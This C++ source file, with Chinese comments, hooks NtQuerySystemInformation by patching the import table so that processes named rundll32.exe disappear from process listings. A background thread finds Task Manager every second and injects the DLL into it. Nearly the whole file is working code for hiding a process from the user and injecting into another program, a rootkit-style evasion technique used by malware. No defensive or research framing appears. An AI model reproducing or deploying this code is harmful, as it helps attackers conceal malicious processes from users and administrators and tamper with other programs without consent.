#define WIN32_LEAN_AND_MEAN             // 从 Windows 头文件中排除极少使用的内容
// Windows 头文件
#define UNICODE
#include <windows.h>
#include <cstdio>
#include <iostream>
#include <fstream>
#define UNICODE
#include <windows.h>
#include <Psapi.h>
#include <TlHelp32.h>
#include <stdio.h>
#include <winternl.h>

#include "runtime/utils.h"
#include "handlers/remote_dll_injection.h"
#include "dllmain.h"

#define STATUS_SUCCESS  ((NTSTATUS)0x00000000L)

LPCWSTR HookName = L"rundll32.exe";

typedef struct _MY_SYSTEM_PROCESS_INFORMATION
{
	ULONG                   NextEntryOffset;
	ULONG                   NumberOfThreads;
	LARGE_INTEGER           Reserved[3];
	LARGE_INTEGER           CreateTime;
	LARGE_INTEGER           UserTime;
	LARGE_INTEGER           KernelTime;
	UNICODE_STRING          ImageName;
	ULONG                   BasePriority;
	HANDLE                  ProcessId;
	HANDLE                  InheritedFromProcessId;
} MY_SYSTEM_PROCESS_INFORMATION, * PMY_SYSTEM_PROCESS_INFORMATION;

typedef NTSTATUS(WINAPI* PNT_QUERY_SYSTEM_INFORMATION)(
	__in       SYSTEM_INFORMATION_CLASS SystemInformationClass,
	__inout    PVOID SystemInformation,
	__in       ULONG SystemInformationLength,
	__out_opt  PULONG ReturnLength
	);

PNT_QUERY_SYSTEM_INFORMATION OriginalNtQuerySystemInformation =
(PNT_QUERY_SYSTEM_INFORMATION)GetProcAddress(GetModuleHandle(L"ntdll"),
	"NtQuerySystemInformation");

// 用来替换的函数
NTSTATUS WINAPI HookedNtQuerySystemInformation(
	__in       SYSTEM_INFORMATION_CLASS SystemInformationClass,
	__inout    PVOID                    SystemInformation,
	__in       ULONG                    SystemInformationLength,
	__out_opt  PULONG                   ReturnLength
)
{
	NTSTATUS status = OriginalNtQuerySystemInformation(SystemInformationClass,
		SystemInformation,
		SystemInformationLength,
		ReturnLength);
	if (SystemProcessInformation == SystemInformationClass && STATUS_SUCCESS == status)
	{
		// Loop through the list of processes
		PMY_SYSTEM_PROCESS_INFORMATION pCurrent = NULL;
		PMY_SYSTEM_PROCESS_INFORMATION pNext = (PMY_SYSTEM_PROCESS_INFORMATION)
			SystemInformation;

		do
		{
			pCurrent = pNext;
			pNext = (PMY_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->
				NextEntryOffset);
			if (!wcsncmp(pNext->ImageName.Buffer, HookName, pNext->ImageName.Length)) // here
			{
				if (!pNext->NextEntryOffset)
				{
					pCurrent->NextEntryOffset = 0;
				}
				else
				{
					pCurrent->NextEntryOffset += pNext->NextEntryOffset;
				}
				pNext = pCurrent;
			}
		} while (pCurrent->NextEntryOffset != 0);
	}
	return status;
}

// 给当前进程设置钩子，隐藏HookName指向的进程名。
void SetHook() {
	MODULEINFO modInfo = { 0 };
	HMODULE hModule = GetModuleHandle(0);

	GetModuleInformation(GetCurrentProcess(), hModule, &modInfo, sizeof(MODULEINFO));

	char szAddress[64];

	LPBYTE pAddress = (LPBYTE)modInfo.lpBaseOfDll;
	PIMAGE_DOS_HEADER pIDH = (PIMAGE_DOS_HEADER)pAddress;

	PIMAGE_NT_HEADERS pINH = (PIMAGE_NT_HEADERS)(pAddress + pIDH->e_lfanew);
	PIMAGE_OPTIONAL_HEADER pIOH = (PIMAGE_OPTIONAL_HEADER) & (pINH->OptionalHeader);
	PIMAGE_IMPORT_DESCRIPTOR pIID = (PIMAGE_IMPORT_DESCRIPTOR)(pAddress + pIOH->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

	for (; pIID->Characteristics; pIID++) {
		if (!strcmp("ntdll.dll", (char*)(pAddress + pIID->Name)))
			break;
	}

	PIMAGE_THUNK_DATA pITD = (PIMAGE_THUNK_DATA)(pAddress + pIID->OriginalFirstThunk);
	PIMAGE_THUNK_DATA pFirstThunkTest = (PIMAGE_THUNK_DATA)((pAddress + pIID->FirstThunk));
	PIMAGE_IMPORT_BY_NAME pIIBM = nullptr;

	for (; !(pITD->u1.Ordinal & IMAGE_ORDINAL_FLAG) && pITD->u1.AddressOfData; pITD++) {
		pIIBM = (PIMAGE_IMPORT_BY_NAME)(pAddress + pITD->u1.AddressOfData);
		if (!strcmp("NtQuerySystemInformation", (char*)(pIIBM->Name)))
			break;
		pFirstThunkTest++;
	}

	// 覆盖函数指针
	DWORD dwOld = NULL;
	VirtualProtect((LPVOID) & (pFirstThunkTest->u1.Function), sizeof(uintptr_t), PAGE_READWRITE, &dwOld);
	pFirstThunkTest->u1.Function = (uintptr_t)HookedNtQuerySystemInformation;
	VirtualProtect((LPVOID) & (pFirstThunkTest->u1.Function), sizeof(uintptr_t), dwOld, NULL);

	sprintf(szAddress, "%s 0x%I64X", (char*)(pIIBM->Name), pFirstThunkTest->u1.Function);

	if (pIDH->e_magic == IMAGE_DOS_SIGNATURE)
	{
		//MessageBoxA(NULL, szAddress, "TEST", MB_OK);
	}
	else
	{
		MessageBoxA(NULL, "SetHook Failed !", "FAIL", MB_OK);
	}

	CloseHandle(hModule);
}

// 假设只有一个任务管理器进程，因为再次打开时会前置显示已经打开的任务管理器
static DWORD taskmgr_pid = 0;
// 维护当前任务管理器的PID，当有新的任务管理器运行的时候就注入
void ScanAndInject()
{
	DWORD pid = GetPIDByName(L"taskmgr.exe");
	printf("taskmgr_hook scan: %lu\n", pid);
	if (pid != taskmgr_pid)
	{
		taskmgr_pid = pid;
		if (pid > 0)
		{
			InjectDll(pid, module_path);
		}
	}
}

static WORD last_scan; // 秒为单位
// 最多每秒扫描一次（该函数没有使用）
void InjectDebounce()
{
	SYSTEMTIME st;
	GetSystemTime(&st);
	if (st.wSecond != last_scan)
	{
		last_scan = st.wSecond;
		ScanAndInject();
	}
}
// 扫描线程的主体函数，不断扫描并注入任务管理器。
DWORD WINAPI ScanningThreadFunc(LPVOID lpParam)
{
	for (;;)
	{
		ScanAndInject();
		Sleep(1000);
	}
	return 0;
}

HANDLE ScanningThread = NULL;
// 启动扫描线程，已经启动则停止
BOOL StartScanningThread()
{
	if (!ScanningThread)
	{
		ScanningThread = CreateThread(
			NULL,                   // default security attributes
			0,                      // use default stack size  
			ScanningThreadFunc,       // thread function name
			NULL,          // argument to thread function 
			0,                      // use default creation flags 
			NULL);   // returns the thread identifier 
		if (ScanningThread == NULL)
		{
			return FALSE;
		}
	}
	return TRUE;
}
// 停止扫描线程
BOOL StopScanningThread()
{
	if (ScanningThread)
	{
		return TerminateThread(
			ScanningThread,
			0
		);
	}
	return TRUE;
}